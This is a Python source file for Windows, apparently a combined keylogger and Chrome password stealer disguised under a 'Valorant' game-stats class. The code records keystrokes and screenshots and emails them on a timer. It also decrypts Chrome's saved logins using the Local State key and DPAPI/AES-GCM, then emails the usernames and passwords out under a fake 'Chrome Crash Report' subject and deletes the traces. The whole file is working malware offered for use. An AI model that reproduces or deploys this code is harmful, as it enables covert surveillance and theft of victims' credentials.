import sqlite3
import keyboard
import smtplib
from threading import Timer
from datetime import timezone, datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from mss import mss
import os
import shutil
from Crypto.Cipher import AES
import json
import base64
import win32crypt
from email.message import EmailMessage
from dotenv import load_dotenv


load_dotenv()


class Valorant:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def sendmail(self, email, password, message, verbose=1):
        
        screenshot = './valorant_report.png'
        msg = MIMEMultipart()
        msg["From"] = os.environ["ADDRESS"]
        msg["To"] = os.environ["ADDRESS"]
        msg["Subject"] = str(f"Valorant Stats {datetime.now()}")
        
        with mss() as sct:
            sct.shot(output=screenshot)

        img_data=""
        with open(screenshot, 'rb') as f:
            img_data = f.read()

        image = MIMEImage(img_data)
        text_part = MIMEText(message, "plain")
        msg.attach(text_part)
        msg.attach(image)
        server = smtplib.SMTP(host=os.environ["HOST"], port=os.environ["PORT"])
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg.as_string())
        os.remove(screenshot)
        server.quit()


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(os.environ["ADDRESS"], os.environ["PASSWORD"], self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


#Password stealer code starts here

    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    
    def decrypt_password(self, password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return "Error occurec in decrypt password"


    def password_stealer_main(self):
        key = self.get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_created")
        
        f = open(os.environ["TEXT_FILE"], "w") 
        

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            
            
            if username or password:
                f.write((f"Origin URL: {origin_url}"))
                f.write("\n")
                f.write((f"Action URL: {action_url}"))
                f.write("\n")
                f.write((f"Username: {username}"))
                f.write("\n")
                f.write((f"Password: {password}"))
                f.write("\n")
            else:
                continue
            f.write(("="*50))
            f.write("\n")

        cursor.close()
        f.close()
        db.close()
        msg = EmailMessage()
        msg["From"] = os.environ["ADDRESS"]
        msg["To"] = os.environ["ADDRESS"]
        msg["Subject"] = str(f"Chrome Crash Report {datetime.now()}")
        msg.add_attachment(open(os.environ["TEXT_FILE"], "r").read(), filename=os.environ["TEXT_FILE"])
        server = smtplib.SMTP(host=os.environ["HOST"], port=os.environ["PORT"])
        server.starttls()
        server.login(os.environ["ADDRESS"], os.environ["PASSWORD"])
        server.sendmail(os.environ["ADDRESS"], os.environ["ADDRESS"], msg.as_string())

        try:
            os.remove(filename)
            os.remove(os.environ["TEXT_FILE"])
        except Exception(e):
            print("password_stealer_main")
    

if __name__ == "__main__":
    Omen = Valorant(interval=int(os.environ["CADENCE"]), report_method="email")
    Omen.password_stealer_main()
    Omen.start()
